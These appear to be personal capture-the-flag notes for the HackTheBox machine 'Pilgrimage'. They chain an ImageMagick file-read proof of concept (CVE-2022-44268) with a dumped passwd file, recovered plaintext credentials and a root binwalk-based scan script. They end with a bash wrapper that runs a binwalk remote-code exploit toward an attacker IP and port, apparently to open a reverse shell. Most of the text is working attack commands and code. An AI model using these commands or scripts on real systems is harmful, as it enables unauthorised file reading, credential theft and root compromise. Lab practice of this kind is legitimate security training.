
root:x:0:0:root:/root:/bin/bash
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash



## User

https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC

### Usage:

#### [](https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC#installing-dependencies)Installing dependencies:

`1. $ apt-get install pngcrush imagemagick exiftool exiv2 -y`

#### [](https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC#change-the-filename-you-want-to-read-below)Change the filename you want to read below:

`2. $ pngcrush -text a "profile" "/etc/hosts" vjp.png`

#### [](https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC#confirm-everything-worked-perfectly)Confirm everything worked perfectly

`3. $ exiv2 -pS pngout.png`

#### [](https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC#trigger-the-poc-via-convert-or-upload-image-to-the-vulnerable-service)Trigger the PoC via convert or upload image to the vulnerable service:

`4. $ convert pngout.png gopro.png`

#### [](https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC#view-content-of-file-was-read)View content of file was read:

`5. $ identify -verbose gopro.png`

#### [](https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC#decrypt-the-content)Decrypt the content:

`6. $ python3 -c 'print(bytes.fromhex("23202f6574632f686f7374730a3132372e302e302e31096c6f63616c686f73740a0a232054686520666f6c6c6f77696e67206c696e65732061726520646573697261626c6520666f7220495076362063617061626c6520686f7374730a3a3a3109096c6f63616c686f7374206970362d6c6f63616c686f7374206970362d6c6f6f706261636b0a666630323a3a3109096970362d616c6c6e6f6465730a666630323a3a3209096970362d616c6c726f75746572730a6475636e740a").decode("utf-8"))'`


 $db = new PDO('sqlite:/var/db/pilgrimage');

testpassword

abigchonkyboi123

emily:abigchonkyboi123


2023/06/27 06:56:55 CMD: UID=0    PID=721    | /bin/bash /usr/sbin/malwarescan.sh 
2023/06/27 06:56:55 CMD: UID=0    PID=720    | /usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ 

#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done





### PWN SCRIPTS


###  exploit.sh

#!/bin/bash                                                                                                         

while true; do                                                                                                      
file=$(ls /var/www/pilgrimage.htb/tmp/)                                                                             

        if [ -z "$file" ]; then                                                                                     
                echo "Nada..."                                                                                      

        else                                                                                                        
                break                                                                                               
        fi                                                                                    

done                                                                                                                

ruta="/var/www/pilgrimage.htb/tmp/$file"                                                                            
echo -e "\n Se encontró un archivo! $ruta\n"                                                                        

cp $ruta .                                                                                                          

echo "[*] Se va a ejecutar el script de python"                                                                     

python3 exploit.py /dev/shm/$file 10.10.14.126 1234

## exploit.py
https://www.exploit-db.com/exploits/51249